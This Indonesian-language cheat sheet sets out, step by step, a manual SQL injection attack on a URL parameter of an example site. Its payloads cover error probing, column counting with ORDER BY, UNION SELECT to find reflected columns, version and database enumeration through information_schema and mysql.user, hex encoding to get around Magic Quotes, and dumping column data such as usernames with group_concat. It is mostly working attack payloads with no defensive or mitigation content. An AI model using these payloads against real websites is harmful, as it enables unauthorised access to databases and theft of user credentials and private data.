# Tujuan

- Memanipulasi syntax SQL (Structured Query Language)
- Memasukkan perintah yang digunakan dalam database dalam URL

# Tes Vulnerabilitas

- Mengecek apakah sebuah website memiliki celah keamanan atau tidak untuk dilakukan SQL injection
- Contoh : http://site.com/product.php?id=3
- Pemakaian karakter kutip tunggal (')
  - Karakter kutip tunggal diletakkan di query SQL yaitu "id=3"
  - Dapat diletakkan sebelum, setelah, atau diantara
  - Contoh : http://site.com/product.php?id=3'
- Pemakaian karakter minus (-)
  - Karakter minus diletakkan sebelum nilai
  - Contoh : http://site.com/product.php?id=-3
- Pemakaian operasi pengurangan ditambah komentar
  - Operasi pengurangan diletakkan setelah query
  - Karakter komentar dengan tanda strip dua kali (--)
  - Contoh : http://site.com/product.php?id=3 2-1--
- Jika terjadi error saat melakukan pengecekan maka website tersebut rentan untuk dilakukan serangan SQL injection
- Inti dari tes vulnerabilitas adalah untuk menampilkan halaman error

# Menentukan Jumlah Kolom

- Mengetahui kolom mana dari sebuah tabel yang bisa dimanfaatkan
- Perintah yang digunakan ORDER BY (Catatan case sensitif tidak berpengaruh)
- Cara mengeceknya secara manual, berikut contohnya :
  - http://site.com/product.php?id=3 ORDER BY 1 --
  - Catatan : akhiri dengan tanda komentar dan lakukan sampai kolom tidak ada atau website error
  - http://site.com/product.php?id=3 ORDER BY 1 -- (Website Normal)
  - http://site.com/product.php?id=3 ORDER BY 2 -- (Website Normal)
  - http://site.com/product.php?id=3 ORDER BY 3 -- (Website Error)
  - Catatan : jika website error berarti kolom tersebut tidak ada dan jumlah kolom telah ditemukan

# Mencari Kolom Yang Vulnerable

- Mencari pada kolom ke berapa yang memiliki celah untuk dilakukan SQL injection
- Perintah yang digunakan UNION SELECT dan tanda -- tetap digunakan diakhir
- Cara mengeceknya secara manual, berikut contohnya :
  - http://site.com/product.php?id=3 UNION SELECT (sesuai jumlah kolom) --
  - Catatan : masukkan UNION SELECT sesuai dengan jumlah kolom yang telah ditemukan sebelumnya
  - http://site.com/product.php?id=3 UNION SELECT 1, 2, 3 --
  - Catatan : jika salah satu angka tersebut muncul di halaman website maka kolom tersebut vulnerable
  - Contoh kolom 2 yang vulnerable maka kolom tersebut dapat diubah menjadi teks lain
  - http://site.com/product.php?id=3 UNION SELECT 1, 'Test 2', 3 --
  - http://site.com/product.php?id=3 UNION SELECT 1, 'Test 2', 'Test 3' --

# Menentukan Versi SQL

- Mendapatkan informasi sesuai versi SQL yang digunakan website
- Perintah yang digunakan @@version atau unhex(hex(@@version))
- Syaratnya jumlah kolom dan kolom yang vulnerable sudah ditemukan
- Contoh : http://site.com/product.php?id=3 UNION SELECT 1, @@version, 3 --
- Contoh : http://site.com/product.php?id=3 UNION SELECT 1, unhex(hex(@@version)), 3 --

# Hal-Hal Krusial Seputar Database

- Menggunakan database information_schema :
  - Mencari informasi dari database
  - Mencari nama database
- Perintah yang digunakan :
  - from information_schema
  - from information_schema.schemat
  - group_concat(schema_name)
  - database()  
  - concat(database())
  - DB_NAME()
  - @@database
  - current_user()
  - from mysql
  - from mysql.user
  - session_user()
  - @@user
  - user()
  - (db)
  - from mysql.db
  - concat(db)
  - @@hostname
  - host_name()
  - @@servername
  - serverproperty()
  - @@datadir
  - datadir()
  - @@language
  - last_insert_id()
  - connection_id()

# Menemukan Nama Tabel

- Menggunakan database information_schema :
  - Mencari informasi tabel
  - Mencari nama tabel
- Perintah yang digunakan :
  - group_concat(table_name) "Catatan : maksimal 1024 karakter"
  - table_name
  - from information_schema.tables
  - from information_schema.tables where table_schema=database()

# Mencari Nama Kolom

- Menggunakan database information_schema :
  - Mencari informasi kolom
  - Mencari nama kolom
- Perintah yang digunakan :
  - group_concat(column_name)
  - from information_schema.columns
  - from information_schema.columns where table_name="nama_table"
  - from information_schema.columns where table_name='nama_table'
- Jika muncul pesan error atau halaman website tidak menampilkan hasil maka kemungkinan pemilik website menggunakan Magic Quotes
- Untuk melewati hal tersebut dengan cara menggunakan kode hexa atau konverter hexa untuk mengubah teks biasa ke char atau hex
  - http://swingnote.com/tools/texttohex.php
  - http://easycalculation.com/ascii-hex.php
- Contoh yang dikonver menjadi hexa adalah nama_table dan setelah diubah menjadi hexa maka tambahkan 0x dibagian awal, contoh : 0x6a6f735f7573657273

# Trik Tabel & Kolom

- Menampilkan beberapa tabel dan kolom sekaligus
- Perintah yang digunakan :
  - (SELECT (@) FROM (SELECT(@:=0x00),(SELECT (@) FROM (information_schema.columns) WHERE (table_schema >= @) AND (@) IN (@:=CONCAT(@,0x0a,'[',table_schema,']>', table_name,'>',column_name))))x)
  - SELECT MID(GROUP_CONCAT(0x3c62723e, 0x5461626c653a20, table_name, 0x3c62723e, 0x436f6c756d6e3a20, column_name ORDER BY (SELECT version from information_schema.tables) SEPARATOR 0x3c62723e),1,1024) FROM information_schema.columns
  - SELECT table_name FROM information_schema.columns WHERE column_name = 'kata atau kriteria yang dicari';
  - SELECT table_name FROM information_schema.columns WHERE column_name = 'username';
  - SELECT table_name FROM information_schema.columns WHERE column_name LIKE '%user%';
  - SELECT column_name FROM information_schema.columns WHERE table_name LIKE '%user%';

# Menampilkan Isi Data

- Melihat data yang terdapat didalam kolom
- Perintah yang digunakan :
  - group_concat(kolom1,0x3a,kolom2,0x3a) "Catatan 0x3a merupakan tanda :"
  - concat_ws(0x3a,kolom1,kolom2)
  - (kolom1)
  - from nama_database.nama_table
